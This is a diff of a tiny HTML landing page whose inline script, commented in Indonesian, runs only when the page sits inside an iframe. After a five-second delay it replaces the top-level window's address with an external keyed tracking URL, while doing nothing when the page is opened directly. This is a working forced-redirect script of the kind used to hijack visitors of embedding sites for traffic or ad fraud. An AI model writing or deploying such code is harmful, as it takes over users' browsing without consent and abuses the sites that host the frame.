@@ -1,29 +1,15 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Landing</title>
-</head>
-<body>
-
-<h1>landing-redirect</h1>
-
 <script>
-(function(){
+(function () {
 
-  // JANGAN redirect kalau dibuka langsung
-  if (window.self === window.top) {
-    console.log("Direct open, no redirect");
-    return;
-  }
+  // hanya jalan di iframe
+  if (window.self === window.top) return;
 
-  // Delay WAJIB untuk iframe traffic
-  setTimeout(function(){
-    window.top.location.href = "https://oversightexcitement.com/bt6678xqp4?key=b4d6bb67a477268e22db1885ae26c970";
+  // delay wajib
+  setTimeout(function () {
+    window.top.location.replace(
+      "https://oversightexcitement.com/bt6678xqp4?key=b4d6bb67a477268e22db1885ae26c970"
+    );
   }, 5000);
 
 })();
 </script>
-
-</body>
-</html>
